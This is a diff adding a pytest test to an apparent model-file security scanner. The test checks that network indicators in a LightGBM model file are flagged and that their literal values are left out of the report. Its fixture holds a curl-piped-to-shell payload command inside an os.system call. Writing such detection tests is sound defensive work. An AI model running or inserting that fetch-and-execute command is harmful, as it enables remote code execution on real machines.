@@ -360,6 +360,41 @@ def test_scan_correlates_command_with_trusted_download_url(tmp_path: Path) -> No
     assert correlation_checks[0].severity == IssueSeverity.CRITICAL
 
 
+def test_scan_omits_ip_literal_network_values(tmp_path: Path) -> None:
+    path = tmp_path / "ip_literal.model"
+    path.write_text(
+        _build_lightgbm_text(
+            [
+                "metadata=os.system('curl https://8.8.8.8/payload.sh | sh')",
+                "callback_ip=1.1.1.1",
+            ]
+        ),
+        encoding="utf-8",
+    )
+
+    result = LightGBMScanner().scan(str(path))
+
+    network_checks = _check_by_name(result, "Network Indicator Check")
+    assert len(network_checks) == 1
+    assert network_checks[0].details == {
+        "examples": [
+            {
+                "line": "18",
+                "type": "url",
+                "value_omitted": "model_text_may_contain_sensitive_literals",
+            },
+            {
+                "line": "19",
+                "type": "public_ip",
+                "value_omitted": "model_text_may_contain_sensitive_literals",
+            },
+        ]
+    }
+    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
+    assert "8.8.8.8" not in failed_details
+    assert "1.1.1.1" not in failed_details
+
+
 def test_scan_ignores_benign_trusted_reference_url(tmp_path: Path) -> None:
     path = tmp_path / "trusted_reference.model"
     path.write_text(
